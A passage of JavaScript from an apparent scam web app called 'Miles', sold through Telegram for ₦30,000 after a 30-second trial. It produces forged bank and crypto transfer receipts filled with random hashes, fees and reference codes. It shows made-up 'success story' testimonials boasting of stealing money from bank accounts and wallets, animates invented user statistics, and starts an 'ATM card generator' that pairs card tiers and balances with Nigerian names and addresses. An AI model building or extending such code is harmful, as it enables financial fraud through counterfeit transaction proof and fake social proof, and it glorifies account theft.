                    padding: 15px 30px;
                    border-radius: 25px;
                    font-weight: 700;
                    cursor: pointer;
                    font-size: 1rem;
                ">
                    💬 Buy Now - Contact @Milestool
                </button>
                <button onclick="contactForPurchaseTelegram()" style="
                    background: linear-gradient(135deg, #0088cc, #0077bb);
                    color: white;
                    border: none;
                    padding: 15px 30px;
                    border-radius: 25px;
                    font-weight: 700;
                    cursor: pointer;
                    font-size: 1rem;
                ">
                    📱 Buy Now - Telegram
                </button>
            </div>
            <p style="margin-top: 20px; font-size: 0.85rem; color: var(--text-muted);">
                Secure payment • Instant activation • Money back guarantee
            </p>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    // Disable all functionality
    document.querySelectorAll('.action-btn').forEach(btn => {
        btn.style.pointerEvents = 'none';
        btn.style.opacity = '0.5';
    });
}

function contactForPurchase() {
    const message = `Hi! I want to purchase Miles full access for ₦30,000.\n\nUser ID: ${userSession.userId}\nWallet: ${userSession.walletAddress}\n\nPlease provide payment details.`;
    window.open(`https://t.me/Milestool?text=${encodeURIComponent(message)}`, '_blank');
}

function contactForPurchaseTelegram() {
    const message = `Hi! I want to purchase Miles full access for ₦30,000.\n\nUser ID: ${userSession.userId}\nWallet: ${userSession.walletAddress}\n\nPlease provide payment details.`;
    window.open(`https://t.me/Milestool?text=${encodeURIComponent(message)}`, '_blank');
}

function checkTrialStatus() {
    if (userSession && userSession.accountType === 'trial' && userSession.trialStartTime) {
        const trialDuration = userSession.trialDuration || 30; // Default to 30 seconds if not set
        const timeElapsed = Date.now() - userSession.trialStartTime;
        const trialDurationMs = trialDuration * 1000;
        
        if (timeElapsed >= trialDurationMs) {
            showTrialExpiredModal();
            return false;
        }
    }
    return true;
}

function logout() {
    localStorage.removeItem('userSession');
    localStorage.removeItem('userPin');
    userSession = null;
    userPin = null;
    location.reload();
}

function showPage(pageId) {
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    document.getElementById(pageId).classList.add('active');
}

function updateBalance() {
    document.getElementById('userBalance').textContent = userSession.balance.toLocaleString('en-NG', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
    });
}

// Utility functions
function getUserSession() {
    const session = localStorage.getItem('userSession');
    if (session) {
        const parsed = JSON.parse(session);
        const currentFingerprint = generateDeviceFingerprint();

        // Check if fingerprint matches
        if (parsed.fingerprint === currentFingerprint) {
            return parsed;
        }
    }
    return null;
}

function saveUserSession(session) {
    localStorage.setItem('userSession', JSON.stringify(session));
}

function generateAdvancedTransactionId() {
    const year = new Date().getFullYear();
    const prefix = 'WM25';
    const timestamp = Date.now().toString(36).toUpperCase();
    const random = Math.random().toString(36).substring(2, 8).toUpperCase();
    const checksum = generateChecksum(timestamp + random);
    return `${prefix}-${timestamp}-${random}-${checksum}`;
}

function generateChecksum(input) {
    let hash = 0;
    for (let i = 0; i < input.length; i++) {
        const char = input.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return Math.abs(hash).toString(36).substring(0, 4).toUpperCase();
}

function generateSessionId() {
    return 'SID' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substring(2, 8).toUpperCase();
}

function generateSessionToken() {
    return 'ST' + Math.random().toString(36).substring(2, 32).toUpperCase();
}

function generateNIBSSReference() {
    const year = new Date().getFullYear();
    const month = (new Date().getMonth() + 1).toString().padStart(2, '0');
    const day = new Date().getDate().toString().padStart(2, '0');
    const sequence = Math.floor(Math.random() * 999999).toString().padStart(6, '0');
    return `${year}${month}${day}${sequence}`;
}

function generateRealistic2025BlockHash() {
    // More realistic block hash format for 2025
    let hash = '0x';
    for (let i = 0; i < 64; i++) {
        hash += Math.floor(Math.random() * 16).toString(16);
    }
    return hash;
}

function generateTransactionHash() {
    let hash = '0x';
    for (let i = 0; i < 64; i++) {
        hash += Math.floor(Math.random() * 16).toString(16);
    }
    return hash;
}

function generateValidatorAddress() {
    return '0x' + Math.random().toString(16).substring(2, 42);
}

function getNetworkDetails(network) {
    const networks = {
        'ETH': 'Ethereum Mainnet (Chain ID: 1)',
        'BSC': 'BNB Smart Chain (Chain ID: 56)',
        'POLYGON': 'Polygon Mainnet (Chain ID: 137)',
        'ARBITRUM': 'Arbitrum One (Chain ID: 42161)',
        'OPTIMISM': 'Optimism Mainnet (Chain ID: 10)'
    };
    return networks[network] || 'Ethereum Mainnet (Chain ID: 1)';
}

function getRandomNode(network) {
    const nodes = {
        'ETH': ['eth-mainnet-01.infura.io', 'eth-rpc.gateway.pokt.network', 'rpc.ankr.com/eth'],
        'BSC': ['bsc-dataseed1.binance.org', 'bsc-dataseed.binance.org', 'rpc.ankr.com/bsc'],
        'POLYGON': ['polygon-rpc.com', 'rpc.ankr.com/polygon', 'rpc-mainnet.maticvigil.com']
    };
    const nodeList = nodes[network] || nodes['ETH'];
    return nodeList[Math.floor(Math.random() * nodeList.length)];
}

function calculateNetworkFee(network, amount) {
    const baseFees = {
        'ETH': 0.002,
        'BSC': 0.0003,
        'POLYGON': 0.001,
        'ARBITRUM': 0.0008,
        'OPTIMISM': 0.0006
    };
    const baseFee = baseFees[network] || 0.002;
    const dynamicFee = parseFloat(amount) * 0.000001; // Very small percentage
    return (baseFee + dynamicFee).toFixed(6);
}

function getCryptoSymbol(network) {
    const symbols = {
        'ETH': 'ETH',
        'BSC': 'BNB',
        'POLYGON': 'MATIC',
        'ARBITRUM': 'ETH',
        'OPTIMISM': 'ETH'
    };
    return symbols[network] || 'ETH';
}

function generateBlockHash() {
    return generateRealistic2025BlockHash();
}

// Simple SHA256 implementation
function sha256(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return Math.abs(hash).toString(16);
}

function setupInputValidation() {
    // Bank account number validation
    const bankInputs = ['bankAccountNumber', 'transferBankAccount'];
    bankInputs.forEach(inputId => {
        const input = document.getElementById(inputId);
        if (input) {
            input.addEventListener('input', function(e) {
                const value = e.target.value.replace(/\D/g, '');
                e.target.value = value;

                if (value.length === 10) {
                    e.target.classList.add('valid');
                    e.target.classList.remove('invalid');
                } else if (value.length > 0) {
                    e.target.classList.add('invalid');
                    e.target.classList.remove('valid');
                } else {
                    e.target.classList.remove('valid', 'invalid');
                }
            });
        }
    });

    // Wallet address validation
    const walletInputs = ['cryptoWalletInput', 'transferCryptoWallet'];
    walletInputs.forEach(inputId => {
        const input = document.getElementById(inputId);
        if (input) {
            input.addEventListener('input', function(e) {
                const value = e.target.value.trim();

                if (/^0x[a-fA-F0-9]{40}$/.test(value)) {
                    e.target.classList.add('valid');
                    e.target.classList.remove('invalid');
                } else if (value.length > 0) {
                    e.target.classList.add('invalid');
                    e.target.classList.remove('valid');
                } else {
                    e.target.classList.remove('valid', 'invalid');
                }
            });
        }
    });
}

function showReceipt(transaction) {
    const transactionId = generateAdvancedTransactionId();
    const timestamp = new Date().toLocaleString('en-US', {
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        timeZoneName: 'short'
    });

    let details = '';
    let statusClass = 'success';
    let networkFee = (Math.random() * 0.01 + 0.001).toFixed(6);
    let processingTime = (Math.random() * 5 + 1).toFixed(1);

    if (transaction.action === 'withdraw') {
        if (transaction.type === 'crypto') {
            const wallet = document.getElementById('cryptoWalletInput').value;
            const network = document.getElementById('cryptoNetwork').value.toUpperCase();
            const shortWallet = wallet.substring(0, 10) + '...' + wallet.substring(wallet.length - 10);

            details = `
                <p><strong>Transaction Type</strong><span>Crypto Withdrawal</span></p>
                <p><strong>Source Wallet</strong><span>${shortWallet}</span></p>
                <p><strong>Network</strong><span>${network} (${network === 'ETH' ? 'Ethereum' : 'Binance Smart Chain'})</span></p>
                <p><strong>Amount Withdrawn</strong><span>₦${transaction.amount.toLocaleString()}</span></p>
                <p><strong>Network Fee</strong><span>${networkFee} ${network}</span></p>
                <p><strong>Block Hash</strong><span>${generateBlockHash()}</span></p>
                <p><strong>Processing Time</strong><span>${processingTime} seconds</span></p>
                <p><strong>Gas Used</strong><span>${Math.floor(Math.random() * 50000 + 21000).toLocaleString()}</span></p>
            `;
        } else {
            const accountNumber = document.getElementById('bankAccountNumber').value;
            const bankSelect = document.getElementById('bankSelect');
            const bankName = bankSelect.dataset.bankName || 'Selected Bank';
            const verifyResult = document.getElementById('bankVerifyResult').textContent;
            const accountName = verifyResult.replace('✅ Account Name: ', '');

            details = `
                <p><strong>Transaction Type</strong><span>Bank Withdrawal</span></p>
                <p><strong>Source Bank</strong><span>${bankName}</span></p>
                <p><strong>Account Number</strong><span>${accountNumber}</span></p>
                <p><strong>Account Holder</strong><span>${accountName}</span></p>
                <p><strong>Amount Withdrawn</strong><span>₦${transaction.amount.toLocaleString()}</span></p>
                <p><strong>Processing Fee</strong><span>₦${Math.floor(transaction.amount * 0.015).toLocaleString()}</span></p>
                <p><strong>Net Amount</strong><span>₦${(transaction.amount - Math.floor(transaction.amount * 0.015)).toLocaleString()}</span></p>
                <p><strong>Reference Code</strong><span>WM${Math.random().toString(36).substring(2, 15).toUpperCase()}</span></p>
            `;
        }
    } else {
        if (transaction.type === 'crypto') {
            const wallet = document.getElementById('transferCryptoWallet').value;
            const shortWallet = wallet.substring(0, 10) + '...' + wallet.substring(wallet.length - 10);

            details = `
                <p><strong>Transaction Type</strong><span>Crypto Transfer</span></p>
                <p><strong>Destination Wallet</strong><span>${shortWallet}</span></p>
                <p><strong>Amount Transferred</strong><span>₦${transaction.amount.toLocaleString()}</span></p>
                <p><strong>Network Fee</strong><span>${networkFee} ETH</span></p>
                <p><strong>Block Hash</strong><span>${generateBlockHash()}</span></p>
                <p><strong>Confirmation</strong><span>6/6 Blocks</span></p>
                <p><strong>Processing Time</strong><span>${processingTime} seconds</span></p>
            `;
        } else {
            const accountNumber = document.getElementById('transferBankAccount').value;
            const transferBankSelect = document.getElementById('transferBankSelect');
            const bankName = transferBankSelect.dataset.bankName || 'Selected Bank';
            const verifyResult = document.getElementById('transferBankResult').textContent;
            const accountName = verifyResult.replace('✅ Account Name: ', '');

            details = `
                <p><strong>Transaction Type</strong><span>Bank Transfer</span></p>
                <p><strong>Destination Bank</strong><span>${bankName}</span></p>
                <p><strong>Account Number</strong><span>${accountNumber}</span></p>
                <p><strong>Beneficiary</strong><span>${accountName}</span></p>
                <p><strong>Amount Transferred</strong><span>₦${transaction.amount.toLocaleString()}</span></p>
                <p><strong>Transfer Fee</strong><span>₦${Math.floor(transaction.amount * 0.01).toLocaleString()}</span></p>
                <p><strong>Reference Code</strong><span>WM${Math.random().toString(36).substring(2, 15).toUpperCase()}</span></p>
            `;
        }
    }

    document.getElementById('receiptDetails').innerHTML = details;
    document.getElementById('transactionId').textContent = transactionId;
    document.getElementById('timestamp').textContent = timestamp;

    document.getElementById('receiptModal').style.display = 'block';

    // Add success sound effect simulation
    setTimeout(() => {
        showNotification('Transaction completed successfully!', 'success');
    }, 500);
}

// Notification sound function
function playNotificationSound() {
    try {
        // Create audio context for notification sound
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        
        // Create oscillator for notification beep
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        // Configure sound
        oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
        oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
        
        gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.2);
        
        oscillator.start(audioContext.currentTime);
        oscillator.stop(audioContext.currentTime + 0.2);
        
        // Vibrate on mobile devices
        if (navigator.vibrate) {
            navigator.vibrate([100, 50, 100]);
        }
    } catch (error) {
        console.log('Audio notification not supported');
    }
}

// Testimonials data
const testimonialsData = [
    {
        name: "Chinedu Okafor",
        location: "Lagos, Nigeria",
        avatar: "CO",
        amount: "₦2,450,000",
        timestamp: "3 minutes ago",
        bank: "GTBank",
        text: "Neural penetration successful! Extracted N2.4M from targeted corporate account using advanced AI algorithms. This exploitation framework is revolutionary! 💰"
    },
    {
        name: "Fatima Hassan",
        location: "Abuja, FCT",
        avatar: "FH",
        amount: "₦1,800,000",
        timestamp: "7 minutes ago",
        bank: "Access Bank",
        text: "Deployed social engineering protocols and extracted ₦1.8M using cloned card data. Miles neural core bypassed all security layers effortlessly! 🔥"
    },
    {
        name: "Emeka Nwankwo",
        location: "Port Harcourt, Rivers",
        avatar: "EN",
        amount: "₦3,200,000",
        timestamp: "12 minutes ago",
        bank: "UBA",
        text: "Infiltrated crypto wallet using advanced password cracking algorithms. Extracted ₦3.2M through neural network penetration. Perfect digital justice! 😈"
    },
    {
        name: "Aisha Bello",
        location: "Kano, Nigeria",
        avatar: "AB",
        amount: "₦950,000",
        timestamp: "18 minutes ago",
        bank: "FirstBank",
        text: "Compromised FirstBank security protocols using social engineering techniques. ₦950K extracted through neural banking infiltration! 💪"
    },
    {
        name: "Tunde Adebayo",
        location: "Ibadan, Oyo",
        avatar: "TA",
        amount: "₦4,100,000",
        timestamp: "25 minutes ago",
        bank: "Zenith Bank",
        text: "Executed untraceable neural transfer of ₦4.1M from corporate systems. Advanced AI cloaking ensures complete anonymity! 🤫"
    },
    {
        name: "Blessing Okoro",
        location: "Enugu, Nigeria",
        avatar: "BO",
        amount: "₦1,650,000",
        timestamp: "31 minutes ago",
        bank: "Sterling Bank",
        text: "Exploited exposed banking credentials using neural analysis. ₦1.65M extracted through AI-powered account breach protocols! 🙌"
    },
    {
        name: "Musa Ibrahim",
        location: "Kaduna, Nigeria",
        avatar: "MI",
        amount: "₦2,800,000",
        timestamp: "38 minutes ago",
        bank: "Polaris Bank",
        text: "Penetrated target banking infrastructure and extracted ₦2.8M using advanced neural hacking techniques. Complete financial liberation! 🏠"
    },
    {
        name: "Ngozi Okonkwo",
        location: "Owerri, Imo",
        avatar: "NO",
        amount: "₦1,200,000",
        timestamp: "44 minutes ago",
        bank: "Fidelity Bank",
        text: "Infiltrated crypto wallet using quantum algorithms and extracted ₦1.2M. Miles neural engine makes exploitation seamless! 💎"
    },
    {
        name: "Yakubu Suleiman",
        location: "Jos, Plateau",
        avatar: "YS",
        amount: "₦3,750,000",
        timestamp: "52 minutes ago",
        bank: "Union Bank",
        text: "Withdrew ₦3.75M from multiple accounts in one session. This app is unreal! 🚀"
    },
    {
        name: "Funmi Adedoyin",
        location: "Akure, Ondo",
        avatar: "FA",
        amount: "₦890,000",
        timestamp: "1 hour ago",
        bank: "Ecobank",
        text: "My pastor's Ecobank account blessed me with ₦890K. God works in mysterious ways! 🙏"
    },
    {
        name: "Ahmed Garba",
        location: "Maiduguri, Borno",
        avatar: "AG",
        amount: "₦5,200,000",
        timestamp: "1 hour ago",
        bank: "Stanbic IBTC",
        text: "Cracked my business partner's crypto wallet and got ₦5.2M. Partnership dissolved! 💸"
    },
    {
        name: "Grace Udoka",
        location: "Calabar, Cross River",
        avatar: "GU",
        amount: "₦1,450,000",
        timestamp: "1 hour ago",
        bank: "Heritage Bank",
        text: "My ex-husband's account gave me ₦1.45M. Child support sorted for years! 👶"
    }
];

// Initialize testimonials and stats
function initializeSuccessStories() {
    const track = document.getElementById('testimonialsTrack');
    if (!track) return;

    // Create testimonial cards (duplicate for seamless loop)
    const allTestimonials = [...testimonialsData, ...testimonialsData];
    
    allTestimonials.forEach(testimonial => {
        const card = createTestimonialCard(testimonial);
        track.appendChild(card);
    });

    // Start live stats updates
    startStatsAnimation();
}

function createTestimonialCard(testimonial) {
    const card = document.createElement('div');
    card.className = 'testimonial-card';
    
    card.innerHTML = `
        <div class="testimonial-header">
            <div class="user-avatar">${testimonial.avatar}</div>
            <div class="user-info">
                <h4>${testimonial.name}</h4>
                <div class="user-location">📍 ${testimonial.location}</div>
            </div>
            <div class="verified-badge">
                ✅ Verified
            </div>
        </div>
        <div class="testimonial-content">
            <div class="testimonial-text">"${testimonial.text}"</div>
            <div class="withdrawal-amount">${testimonial.amount}</div>
        </div>
        <div class="testimonial-footer">
            <div class="timestamp">⏰ ${testimonial.timestamp}</div>
            <div class="bank-name">${testimonial.bank}</div>
        </div>
    `;
    
    return card;
}

function startStatsAnimation() {
    let totalUsers = 47329;
    let totalWithdrawn = 2.8;
    let successRate = 97.3;
    let onlineNow = 1247;

    setInterval(() => {
        // Update stats with realistic variations
        totalUsers += Math.floor(Math.random() * 15) + 5;
        totalWithdrawn += (Math.random() * 0.1) + 0.02;
        successRate = Math.min(99.9, successRate + (Math.random() * 0.2) - 0.1);
        onlineNow += Math.floor(Math.random() * 40) - 20;
        onlineNow = Math.max(800, Math.min(2000, onlineNow));

        // Update DOM elements
        const totalUsersEl = document.getElementById('totalUsers');
        const totalWithdrawnEl = document.getElementById('totalWithdrawn');
        const successRateEl = document.getElementById('successRate');
        const onlineNowEl = document.getElementById('onlineNow');

        if (totalUsersEl) totalUsersEl.textContent = totalUsers.toLocaleString();
        if (totalWithdrawnEl) totalWithdrawnEl.textContent = totalWithdrawn.toFixed(1) + 'B';
        if (successRateEl) successRateEl.textContent = successRate.toFixed(1) + '%';
        if (onlineNowEl) onlineNowEl.textContent = onlineNow.toLocaleString();
    }, Math.random() * 4000 + 8000); // Update every 8-12 seconds
}

// Show success stories only on activation page
function showSuccessStories() {
    const currentPage = document.querySelector('.page.active');
    if (!currentPage) return;

    const pageId = currentPage.id;
    if (pageId === 'activationPage') {
        let storiesSection = document.getElementById('successStories');
        if (!storiesSection) {
            // Create and insert success stories section
            const storiesHTML = `
                <section id="successStories" class="success-stories-section">
                    <div class="container">
                        <div class="section-header">
                            <h2 class="section-title">
                                <span class="gradient-text">🎯 Live Success Stories</span>
                                <span class="live-indicator">● LIVE</span>
                            </h2>
                            <p class="section-subtitle">Real Nigerians Making Real Money with Miles</p>
                        </div>

                        <div class="live-stats">
                            <div class="stat-card">
                                <div class="stat-number" id="totalUsers">47,329</div>
                                <div class="stat-label">Active Users</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-number">N<span id="totalWithdrawn">2.8B</span></div>
                                <div class="stat-label">Total Withdrawn</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-number" id="successRate">97.3%</div>
                                <div class="stat-label">Success Rate</div>
                            </div>
                            <div class="stat-card">
                                <div class="stat-number" id="onlineNow">1,247</div>
                                <div class="stat-label">Online Now</div>
                            </div>
                        </div>

                        <div class="testimonials-container">
                            <div class="testimonials-track" id="testimonialsTrack">
                            </div>
                        </div>

                        <div class="trust-indicators">
                            <div class="trust-item">
                                <span class="trust-icon">🔒</span>
                                <span>Bank-level Security</span>
                            </div>
                            <div class="trust-item">
                                <span class="trust-icon">⚡</span>
                                <span>Instant Withdrawals</span>
                            </div>
                            <div class="trust-item">
                                <span class="trust-icon">🛡️</span>
                                <span>100% Anonymous</span>
                            </div>
                            <div class="trust-item">
                                <span class="trust-icon">💰</span>
                                <span>No Daily Limits</span>
                            </div>
                        </div>
                    </div>
                </section>
            `;

            // Insert before footer
            const footer = document.querySelector('.genx-footer');
            if (footer) {
                footer.insertAdjacentHTML('beforebegin', storiesHTML);
                initializeSuccessStories();
            }
        }
    }
}

// Update page show function to include success stories
function showPageWithSuccessStories(pageId) {
    showPage(pageId);
    setTimeout(() => {
        showSuccessStories();
    }, 100);
}

// Live stats animation
function animateLiveStats() {
    const totalUsersEl = document.getElementById('totalUsers');
    const totalWithdrawnEl = document.getElementById('totalWithdrawn');
    const successRateEl = document.getElementById('successRate');
    const onlineNowEl = document.getElementById('onlineNow');
    
    if (!totalUsersEl || !totalWithdrawnEl || !successRateEl || !onlineNowEl) return;
    
    setInterval(() => {
        // Animate user count (increment by 3-8 every few seconds)
        const currentUsers = parseInt(totalUsersEl.textContent.replace(/,/g, ''));
        const newUsers = currentUsers + Math.floor(Math.random() * 6) + 3;
        totalUsersEl.textContent = newUsers.toLocaleString();
        
        // Animate amount (increase by random amount)
        const currentAmount = parseFloat(totalWithdrawnEl.textContent.replace(/N|B|M|,/g, ''));
        const increment = (Math.random() * 0.08) + 0.02; // 0.02 - 0.1B increase
        const newAmount = currentAmount + increment;
        totalWithdrawnEl.textContent = `${newAmount.toFixed(1)}B`;
        
        // Slight success rate fluctuation
        const currentSuccess = parseFloat(successRateEl.textContent.replace('%', ''));
        const variation = (Math.random() - 0.5) * 0.3; // ±0.15% variation
        const newSuccess = Math.max(97.0, Math.min(99.9, currentSuccess + variation));
        successRateEl.textContent = `${newSuccess.toFixed(1)}%`;
        
        // Online users fluctuation
        const currentOnline = parseInt(onlineNowEl.textContent.replace(/,/g, ''));
        const onlineVariation = Math.floor((Math.random() - 0.5) * 60); // ±30 users
        const newOnline = Math.max(800, Math.min(2500, currentOnline + onlineVariation));
        onlineNowEl.textContent = newOnline.toLocaleString();
        
    }, 8000 + Math.random() * 4000); // Every 8-12 seconds
}

// Duplicate testimonials for seamless loop
function setupTestimonialsLoop() {
    const track = document.querySelector('.testimonials-track');
    if (!track) return;
    
    const testimonials = track.innerHTML;
    track.innerHTML = testimonials + testimonials; // Duplicate for seamless loop
}

// Enhanced testimonials are handled by initializeSuccessStories function

// ATM Card Generator Functions
let selectedCardProvider = null;
let selectedCardTier = null;

const cardProviders = {
    visa: {
        name: 'Visa',
        icon: '💳',
        prefix: '4',
        tiers: {
            classic: { name: 'Classic', balance: [50000, 500000], color: 'classic' },
            gold: { name: 'Gold', balance: [500000, 2000000], color: 'gold' },
            platinum: { name: 'Platinum', balance: [2000000, 5000000], color: 'platinum' },
            black: { name: 'World Black', balance: [5000000, 20000000], color: 'black' },
            diamond: { name: 'Infinite Diamond', balance: [20000000, 100000000], color: 'diamond' }
        }
    },
    mastercard: {
        name: 'Mastercard',
        icon: '🔴',
        prefix: '5',
        tiers: {
            classic: { name: 'Standard', balance: [50000, 500000], color: 'classic' },
            gold: { name: 'Gold', balance: [500000, 2000000], color: 'gold' },
            platinum: { name: 'Platinum', balance: [2000000, 5000000], color: 'platinum' },
            black: { name: 'World Elite', balance: [5000000, 20000000], color: 'black' },
            diamond: { name: 'World Elite Diamond', balance: [20000000, 100000000], color: 'diamond' }
        }
    },
    verve: {
        name: 'Verve',
        icon: '🟢',
        prefix: '6',
        tiers: {
            classic: { name: 'Classic', balance: [30000, 300000], color: 'classic' },
            gold: { name: 'Gold', balance: [300000, 1500000], color: 'gold' },
            platinum: { name: 'Platinum', balance: [1500000, 4000000], color: 'platinum' },
            black: { name: 'Premium Black', balance: [4000000, 15000000], color: 'black' },
            diamond: { name: 'Diamond Elite', balance: [15000000, 50000000], color: 'diamond' }
        }
    }
};

const nigerianNames = {
    male: [
        'Chinedu Okafor', 'Emeka Nwankwo', 'Tunde Adebayo', 'Musa Ibrahim', 'Yakubu Suleiman',
        'Ahmed Garba', 'Kelechi Okoro', 'Segun Afolabi', 'Umar Hassan', 'Daniel Adeniyi',
        'Ibrahim Yusuf', 'Chukwuma Igwe', 'Adeola Bakare', 'Olumide Ogundimu', 'Nasir Ahmad',
        'Vincent Okeke', 'Samuel Oladele', 'Abdullahi Bello', 'Chigozie Eze', 'Rotimi Akinola'
    ],
    female: [
        'Fatima Hassan', 'Aisha Bello', 'Blessing Okoro', 'Ngozi Okonkwo', 'Funmi Adedoyin',
        'Grace Udoka', 'Chioma Nwosu', 'Hadiza Mohammed', 'Folake Ogunbayo', 'Amina Aliyu',
        'Adunni Ogundipe', 'Khadija Musa', 'Olayinka Fashola', 'Hauwa Abdullahi', 'Chinaza Ibe',
        'Rashida Usman', 'Ifeoma Anyanwu', 'Zainab Salisu', 'Bukola Adeleke', 'Maryam Shehu'
    ]
};

const nigerianBanks = [
    'Access Bank', 'GTBank', 'First Bank', 'UBA', 'Zenith Bank', 'Fidelity Bank',
    'Union Bank', 'Sterling Bank', 'Stanbic IBTC', 'Ecobank', 'Heritage Bank',
    'Keystone Bank', 'Unity Bank', 'Wema Bank', 'FCMB', 'Polaris Bank'
];

const nigerianAddresses = {
    lagos: [
        { street: '15 Adeola Odeku Street', area: 'Victoria Island', city: 'Lagos', state: 'Lagos', zipCode: '101241' },
        { street: '42 Allen Avenue', area: 'Ikeja', city: 'Lagos', state: 'Lagos', zipCode: '100271' },
        { street: '8 Awolowo Road', area: 'Ikoyi', city: 'Lagos', state: 'Lagos', zipCode: '106104' },
        { street: '25 Admiralty Way', area: 'Lekki Phase 1', city: 'Lagos', state: 'Lagos', zipCode: '106104' },
        { street: '67 Opebi Road', area: 'Ikeja', city: 'Lagos', state: 'Lagos', zipCode: '100271' },
        { street: '33 Ajose Adeogun Street', area: 'Victoria Island', city: 'Lagos', state: 'Lagos', zipCode: '101241' },
        { street: '18 Kofo Abayomi Street', area: 'Victoria Island', city: 'Lagos', state: 'Lagos', zipCode: '101241' },
        { street: '91 Agege Motor Road', area: 'Mushin', city: 'Lagos', state: 'Lagos', zipCode: '100252' }
    ],
    abuja: [
        { street: '7 Gana Street', area: 'Maitama', city: 'Abuja', state: 'FCT', zipCode: '900271' },
        { street: '15 Yakubu Gowon Crescent', area: 'Asokoro', city: 'Abuja', state: 'FCT', zipCode: '900231' },
        { street: '23 Aminu Kano Crescent', area: 'Wuse II', city: 'Abuja', state: 'FCT', zipCode: '900288' },
        { street: '41 Cadastral Zone A03', area: 'Garki', city: 'Abuja', state: 'FCT', zipCode: '900211' },
        { street: '12 Herbert Macaulay Way', area: 'Central Area', city: 'Abuja', state: 'FCT', zipCode: '900001' },
        { street: '56 Ahmadu Bello Way', area: 'Victoria Island', city: 'Abuja', state: 'FCT', zipCode: '900271' }
    ],
    port_harcourt: [
        { street: '34 Aba Road', area: 'Port Harcourt', city: 'Port Harcourt', state: 'Rivers', zipCode: '500001' },
        { street: '12 Trans Amadi Industrial Layout', area: 'Trans Amadi', city: 'Port Harcourt', state: 'Rivers', zipCode: '500272' },
        { street: '28 Old Aba Road', area: 'Rumuokwuta', city: 'Port Harcourt', state: 'Rivers', zipCode: '500102' },
        { street: '45 Stadium Road', area: 'Port Harcourt', city: 'Port Harcourt', state: 'Rivers', zipCode: '500001' }
    ],
    kano: [
        { street: '19 Bompai Road', area: 'Bompai', city: 'Kano', state: 'Kano', zipCode: '700281' },
        { street: '7 Murtala Mohammed Way', area: 'Fagge', city: 'Kano', state: 'Kano', zipCode: '700001' },
        { street: '33 Zoo Road', area: 'Kano', city: 'Kano', state: 'Kano', zipCode: '700001' },
        { street: '14 Ibrahim Taiwo Road', area: 'Nassarawa GRA', city: 'Kano', state: 'Kano', zipCode: '700271' }
    ],
    others: [
        { street: '22 University Road', area: 'Benin City', city: 'Benin City', state: 'Edo', zipCode: '300271' },
        { street: '18 New Market Road', area: 'Enugu', city: 'Enugu', state: 'Enugu', zipCode: '400001' },
        { street: '35 Owerri Road', area: 'Aba', city: 'Aba', state: 'Abia', zipCode: '450001' },
        { street: '27 Calabar Road', area: 'Uyo', city: 'Uyo', state: 'Akwa Ibom', zipCode: '520271' },
        { street: '41 Makurdi Road', area: 'Jos', city: 'Jos', state: 'Plateau', zipCode: '930001' },
        { street: '16 Gboko Road', area: 'Makurdi', city: 'Makurdi', state: 'Benue', zipCode: '970001' }
    ]
};

function setupAtmCardGeneratorListeners() {
    // Card provider selection
    document.querySelectorAll('.card-provider-option').forEach(option => {
        option.addEventListener('click', function() {
            selectCardProvider(this.dataset.provider);
        });
    });

    // Generate button
    const generateBtn = document.getElementById('generateAtmCardBtn');
    if (generateBtn) {
        generateBtn.addEventListener('click', generateAtmCard);
    }

    // Generated card modal actions
    const copyBtn = document.getElementById('copyAtmCardBtn');
    const closeBtn = document.getElementById('closeAtmCardBtn');

    if (copyBtn) {
        copyBtn.addEventListener('click', copyAtmCardDetails);
    }

    if (closeBtn) {
        closeBtn.addEventListener('click', closeGeneratedAtmCard);
    }
}

function selectCardProvider(provider) {
    selectedCardProvider = provider;
    
    // Update UI
    document.querySelectorAll('.card-provider-option').forEach(option => {
        option.classList.remove('selected');
    });
    document.querySelector(`[data-provider="${provider}"]`).classList.add('selected');

    // Show tier selection
    showTierOptions(provider);
}

function showTierOptions(provider) {
    const tierSelection = document.getElementById('tierSelection');
    const tierGrid = document.getElementById('cardTiersGrid');
    const providerData = cardProviders[provider];

    tierGrid.innerHTML = '';
    
    Object.entries(providerData.tiers).forEach(([tierKey, tierData]) => {
        const tierOption = document.createElement('div');
        tierOption.className = 'card-tier-option';
        tierOption.dataset.tier = tierKey;
        tierOption.innerHTML = `
            <div class="tier-name">${tierData.name}</div>
            <div class="tier-balance">₦${tierData.balance[0].toLocaleString()} - ₦${tierData.balance[1].toLocaleString()}</div>
            <div class="tier-features">
                ${getTierFeatures(tierKey)}
            </div>
        `;
        
        tierOption.addEventListener('click', function() {
            selectTier(tierKey);
        });
        
        tierGrid.appendChild(tierOption);
    });

    tierSelection.style.display = 'block';
    tierSelection.scrollIntoView({ behavior: 'smooth' });
}

function getTierFeatures(tier) {
    const features = {
        classic: 'Basic benefits • Local ATM access',
        gold: 'Priority support • International access',
        platinum: 'Concierge service • Premium rewards',
        black: 'VIP treatment • Exclusive events',
        diamond: 'Ultra-premium • Unlimited everything'
    };
    return features[tier] || 'Premium features';
}

function selectTier(tier) {
    selectedCardTier = tier;
    
    // Update UI
    document.querySelectorAll('.card-tier-option').forEach(option => {
        option.classList.remove('selected');
    });
    document.querySelector(`[data-tier="${tier}"]`).classList.add('selected');

    // Show generation controls
    document.getElementById('cardGenerationControls').style.display = 'block';
    document.getElementById('cardGenerationControls').scrollIntoView({ behavior: 'smooth' });
}

function generateAtmCard() {
    if (!selectedCardProvider || !selectedCardTier) {
        showNotification('Please select card provider and tier first', 'error');
        return;
    }

    showAtmCardGenerationModal();
}

